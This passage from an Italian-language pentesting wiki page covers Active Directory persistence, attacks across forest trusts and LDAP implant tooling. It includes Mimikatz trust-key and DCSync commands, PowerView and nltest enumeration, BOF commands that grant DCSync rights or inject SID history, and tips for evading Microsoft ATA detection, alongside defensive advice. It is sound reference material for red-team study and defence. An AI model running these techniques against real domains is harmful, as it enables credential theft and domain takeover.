{{#endref}}

### ACL Persistence

Potresti **assegnare** alcune **permissions speciali** a un **utente** su determinati oggetti di dominio che permetteranno all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** vengono usati per **memorizzare** i **permessi** che un **oggetto** ha **su** un altro **oggetto**. Se riesci a fare anche solo una **piccola modifica** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Alterare **LSASS** in memoria per stabilire una **password universale**, concedendo accesso a tutti gli account del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri cos'è un SSP (Security Support Provider) qui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **own SSP** per **catturare** in **clear text** le **credentials** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **pushare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare **log** riguardo alle **modifiche**. Hai bisogno di privilegi **DA** ed essere all'interno del **root domain**.\
Nota che se usi dati sbagliati, appariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso di come escalare privilegi se si hanno **sufficienti permessi per leggere le LAPS passwords**. Tuttavia, queste password possono anche essere usate per **mantenere la persistenza**.\
Vedi:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** come il confine di sicurezza. Questo implica che **compromettere un singolo dominio potrebbe potenzialmente portare alla compromissione dell'intera Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che permette a un utente di un **dominio** di accedere a risorse in un altro **dominio**. Fondamentalmente crea un collegamento tra i sistemi di autenticazione dei due domini, permettendo il flusso delle verifiche di autenticazione. Quando i domini stabiliscono un trust, scambiano e conservano specifiche **chiavi** all'interno dei loro **Domain Controllers (DCs)**, che sono cruciali per l'integrità del trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **trusted domain**, deve prima richiedere un ticket speciale noto come **inter-realm TGT** al proprio DC del dominio. Questo TGT è cifrato con una **chiave di trust** condivisa che entrambi i domini hanno concordato. L'utente presenta quindi questo TGT al **DC del trusted domain** per ottenere un service ticket (**TGS**). Dopo la verifica dell'inter-realm TGT da parte del DC del dominio trusted, viene emesso un TGS che concede all'utente l'accesso al servizio.

**Passaggi**:

1. Un **client computer** in **Domain 1** inizia il processo usando il proprio **NTLM hash** per richiedere un **Ticket Granting Ticket (TGT)** al suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client richiede quindi un **inter-realm TGT** da DC1, necessario per accedere alle risorse in **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte del trust bidirezionale tra domini.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2)** di Domain 2.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server in Domain 2 al quale il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere l'accesso al servizio in Domain 2.

### Different trusts

È importante notare che **un trust può essere a 1 way o a 2 ways**. Nella modalità a 2 ways, entrambi i domini si fidano a vicenda, ma nella relazione di trust **one way** uno dei domini sarà il **trusted** e l'altro il **trusting**. In quest'ultimo caso, **potrai accedere solo alle risorse del trusting domain partendo dal trusted**.

Se Domain A trusts Domain B, A è il trusting domain e B è il trusted. Inoltre, in **Domain A** questo sarà un **Outbound trust**; e in **Domain B**, questo sarà un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Configurazione comune all'interno della stessa forest, dove un child domain ha automaticamente un two-way transitive trust con il parent domain. Ciò significa che le richieste di autenticazione possono fluire senza soluzione di continuità tra parent e child.
- **Cross-link Trusts**: Chiamati anche "shortcut trusts", sono stabiliti tra child domain per accelerare i processi di referral. In forest complesse, i referral di autenticazione tipicamente devono salire fino alla root della forest e poi scendere verso il dominio di destinazione. Creando cross-links, il percorso è accorciato, utile soprattutto in ambienti geograficamente distribuiti.
- **External Trusts**: Sono configurati tra domini diversi e non correlati e sono per natura non-transitive. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trusts sono utili per accedere a risorse in un dominio fuori dalla forest corrente che non è connesso tramite forest trust. La sicurezza è rafforzata tramite SID filtering con external trusts.
- **Tree-root Trusts**: Questi trust sono automaticamente stabiliti tra il forest root domain e un nuovo tree root aggiunto. Pur non essendo comuni, i tree-root trusts sono importanti per aggiungere nuovi tree domain a una forest, permettendo loro di mantenere un nome di dominio unico e garantendo transitive two-way. Maggiori informazioni sono disponibili nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Tipo di trust two-way transitive tra due forest root domains, che applica anche SID filtering per migliorare le misure di sicurezza.
- **MIT Trusts**: Questi trust sono stabiliti con domini Kerberos non-Windows compatibili con [RFC4120](https://tools.ietf.org/html/rfc4120). I MIT trusts sono più specializzati e servono ambienti che richiedono integrazione con sistemi Kerberos esterni all'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una relazione di trust può essere anche **transitive** (A trusts B, B trusts C, allora A trusts C) o **non-transitive**.
- Una relazione di trust può essere impostata come **bidirectional trust** (entrambi si fidano reciprocamente) o come **one-way trust** (solo uno dei due si fida dell'altro).

### Attack Path

1. **Enumerate** le relazioni di trust
2. Controlla se qualche **security principal** (user/group/computer) ha **accesso** alle risorse dell'**altro dominio**, magari tramite voci ACE o essendo in gruppi dell'altro dominio. Cerca **relazioni cross-domain** (probabilmente il trust è stato creato per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Comprometti** gli **account** che possono **pivotare** attraverso i domini.

Gli attaccanti possono accedere a risorse in un altro dominio tramite tre meccanismi principali:

- **Local Group Membership**: I principal possono essere aggiunti a gruppi locali sulle macchine, come il gruppo “Administrators” su un server, concedendo loro controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi nel dominio esterno. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal potrebbero essere specificati in una **ACL**, in particolare come entità in **ACE** all'interno di una **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire la meccanica di ACL, DACL e ACE, il whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare i foreign security principals nel dominio. Questi saranno utenti/gruppi provenienti da **un dominio/forest esterno**.

Puoi verificare questo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust di dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi verificare quale viene usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare a Enterprise admin nel dominio child/parent abusando della trust tramite SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendere come la Configuration Naming Context (NC) possa essere sfruttata è cruciale. La Configuration NC funge da repository centrale per i dati di configurazione nell'intera foresta in ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) all'interno della foresta, con i DC scrivibili che mantengono una copia scrivibile della Configuration NC. Per sfruttare questo è necessario avere **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il container Sites della Configuration NC include informazioni sui siti di tutti i computer uniti al dominio nella foresta AD. Operando con privilegi SYSTEM su qualsiasi DC, un attaccante può collegare GPO ai siti root dei DC. Questa azione può compromettere il dominio root manipolando le policy applicate a questi siti.

Per informazioni approfondite, si possono consultare le ricerche su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore di attacco consiste nel prendere di mira gMSA privilegiati all'interno del dominio. La KDS Root key, essenziale per calcolare le password delle gMSA, è memorizzata nella Configuration NC. Con privilegi SYSTEM su qualsiasi DC è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA nella foresta.

Analisi dettagliata e guida step-by-step sono disponibili in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco complementare su MSA delegati (BadSuccessor – abuso degli attributi di migrazione):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerche esterne aggiuntive: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attaccante può modificare lo Schema AD per concedere a qualsiasi utente il controllo completo su tutte le classi. Ciò potrebbe portare ad accessi non autorizzati e al controllo su nuovi oggetti AD creati.

Ulteriori letture sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 mira al controllo degli oggetti PKI per creare un template di certificato che consenta l'autenticazione come qualsiasi utente all'interno della foresta. Dal momento che gli oggetti PKI risiedono nella Configuration NC, il compromesso di un DC child scrivibile permette l'esecuzione di attacchi ESC5.

Maggiori dettagli possono essere letti in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari privi di ADCS, l'attaccante ha la capacità di impostare i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **your domain is trusted** da un dominio esterno che ti concede **undetermined permissions** su di esso. Dovrai identificare **which principals of your domain have which access over the external domain** e poi cercare di sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **concedendo** alcuni **privilegi** a principal provenienti da **domini diversi**.

Tuttavia, quando un **dominio di fiducia** è accettato dal dominio che si fida, il dominio di fiducia **crea un utente** con un **nome prevedibile** che utilizza come **password la password di trust**. Ciò significa che è possibile **accedere con un utente dal dominio che si fida per entrare nel dominio di fiducia** per enumerarlo e provare a scalare ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il dominio di fiducia è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** rispetto alla trust di dominio (il che non è molto comune).

Un altro modo per compromettere il dominio di fiducia è aspettare su una macchina a cui un **utente del dominio di fiducia può accedere** per effettuare il login via **RDP**. L'attaccante potrebbe quindi iniettare codice nel processo della sessione RDP e **accedere al dominio d'origine della vittima** da lì.  
Inoltre, se la **vittima ha montato il suo hard drive**, dal processo della **sessione RDP** l'attaccante potrebbe installare **backdoors** nella **cartella di avvio del disco**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazione dell'abuso delle trust di dominio

### **Filtraggio SID:**

- Il rischio di attacchi che sfruttano l'attributo SIDHistory attraverso le trust tra foreste è mitigato dal Filtraggio SID, che è attivato per default su tutte le trust inter-foresta. Questo si basa sull'assunzione che le trust intra-foresta siano sicure, considerando la foresta, piuttosto che il dominio, come confine di sicurezza secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: il Filtraggio SID può interrompere applicazioni e l'accesso degli utenti, portando alla sua disattivazione occasionale.

### **Autenticazione Selettiva:**

- Per le trust inter-foresta, l'uso dell'Autenticazione Selettiva garantisce che gli utenti delle due foreste non vengano autenticati automaticamente. Invece, sono necessarie autorizzazioni esplicite affinché gli utenti possano accedere ai domini e ai server all'interno del dominio o della foresta che si fida.
- È importante notare che queste misure non proteggono dall'abuso del Configuration Naming Context (NC) scrivibile né dagli attacchi sull'account di trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso di AD basato su LDAP da On-Host Implants

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementa primitive LDAP in stile bloodyAD come x64 Beacon Object Files che girano interamente all'interno di un on-host implant (es. Adaptix C2). Gli operatori compilano il pacchetto con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, caricano `ldap.axs`, e poi chiamano `ldap <subcommand>` dal beacon. Tutto il traffico passa nel contesto di sicurezza del logon corrente su LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, quindi non sono necessari socks proxies o artefatti su disco.

### Enumerazione LDAP lato implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` risolvono nomi brevi / percorsi OU in DN completi ed estraggono gli oggetti corrispondenti.
- `get-object`, `get-attribute`, and `get-domaininfo` recuperano attributi arbitrari (inclusi security descriptors) oltre ai metadata della foresta/dominio da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` espongono roasting candidates, impostazioni di delega e i descriptor esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direttamente da LDAP.
- `get-acl` and `get-writable --detailed` analizzano la DACL per elencare trustees, diritti (GenericAll/WriteDACL/WriteOwner/attribute writes) e l'ereditarietà, fornendo bersagli immediati per l'escalation di privilegi tramite ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive di scrittura LDAP per escalation e persistenza

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all'operatore di posizionare nuovi principal o account macchina ovunque esistano diritti sull'OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` dirottano direttamente i target una volta che vengono trovati diritti di write-property.
- Comandi focalizzati sulle ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` traducono WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo dei membri di gruppi, o privilegi di DCSync replication senza lasciare artefatti PowerShell/ADSI. I corrispettivi `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting, e abuso di Kerberos

- `add-spn`/`set-spn` rendono istantaneamente un utente compromesso Kerberoastable; `add-asreproastable` (UAC toggle) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, flag UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### Injection di sidHistory, rilocazione OU e modellamento della superficie d'attacco

- `add-sidhistory` inietta SID privilegiati nello SID history di un principal controllato (see [SID-History Injection](sid-history-injection.md)), fornendo ereditarietà di accesso stealth interamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo ad un attaccante di spostare asset in OUs dove i diritti delegati esistono già prima di abusare di `set-password`, `add-groupmember`, o `add-spn`.
- Comandi di rimozione strettamente limitati (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) permettono un rapido rollback dopo che l'operatore ha raccolto credenziali o persistenza, minimizzando la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Contromisure per la protezione delle credenziali**

- **Domain Admins Restrictions**: Si raccomanda che i Domain Admins possano effettuare il login solo sui Domain Controllers, evitando il loro utilizzo su altri host.
- **Service Account Privileges**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Temporal Privilege Limitation**: Per attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit degli Event ID 2889/3074/3075 e poi applicare LDAP signing più LDAPS channel binding su DCs/client per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementazione di tecniche di deception**

- Implementare la deception comporta piazzare trappole, come utenti o computer esca, con caratteristiche quali password che non scadono o marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l'aggiunta di questi a gruppi ad alto privilegio.
- Un esempio pratico prevede l'uso di strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maggiori informazioni sul deployment di tecniche di deception sono disponibili su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Individuazione della deception**

- **Per gli oggetti utente**: Indicatori sospetti includono ObjectSID atipico, accessi poco frequenti, date di creazione e basso numero di tentativi di password errata.
- **Indicatori generali**: Confrontare gli attributi degli oggetti potenzialmente esca con quelli genuini può rivelare incongruenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare tali deception.

### **Bypassare i sistemi di rilevamento**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitare l'enumerazione delle sessioni sui Domain Controllers per prevenire il rilevamento da parte di ATA.
- **Ticket Impersonation**: Utilizzare chiavi **aes** per la creazione di ticket aiuta a evadere il rilevamento non degradando a NTLM.
- **DCSync Attacks**: Si consiglia di eseguire da un host non Domain Controller per evitare il rilevamento ATA, poiché l'esecuzione diretta da un Domain Controller genererà allarmi.

## Riferimenti

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
